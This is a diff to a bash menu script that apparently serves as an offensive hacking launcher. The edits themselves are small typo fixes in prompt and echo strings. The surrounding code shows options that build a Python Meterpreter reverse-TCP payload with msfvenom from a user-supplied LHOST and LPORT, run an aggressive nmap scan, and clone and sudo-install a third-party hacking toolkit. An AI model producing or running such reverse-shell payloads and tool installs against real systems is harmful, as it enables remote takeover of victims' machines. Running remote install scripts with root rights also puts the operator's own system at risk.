@@ -77,7 +77,7 @@ case $choice in
 		echo "makeing a payload"
                 read -p "ENTER your LHOST " LHOST
                 read -p "ENTER your LPORT : " LPORT
-                read -p "ENTER your apk final name : " NAME
+                read -p "ENTER your py final name : " NAME
 		msfvenom -p python/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -o $NAME.py	
 		;;
 	6)
@@ -108,11 +108,11 @@ case $choice in
 		nmap -T4 -A -v $IP
 		;;
 	10)
-		echo"DOWNLOADING HACKINGTOOL"
+		echo "DOWNLOADING HACKINGTOOL"
 		git clone https://github.com/Z4nzu/hackingtool.git && chmod -R 755 hackingtool && cd hackingtool && sudo bash install.sh && sudo hackingtool
 		;;
 	11) 
-		echo"RUNING HACKINGTOOL"
+		echo "RUNING HACKINGTOOL"
 		sudo hackingtool
 		;;
 	12) 
@@ -125,7 +125,7 @@ case $choice in
 		author
 		echo "creating a QR code "
 		read -p "ENTER THE LINK TO MAKE QR " LINK
-		read -p "ENTER NAME TO SAFE QR CODE " QRN
+		read -p "ENTER NAME TO SAVE QR CODE " QRN
 		qrencode -o $QRN "$LINK"
 		echo "THE QR CREATED YOU CAN FIND IT IN TOOL FILE"
 		;;
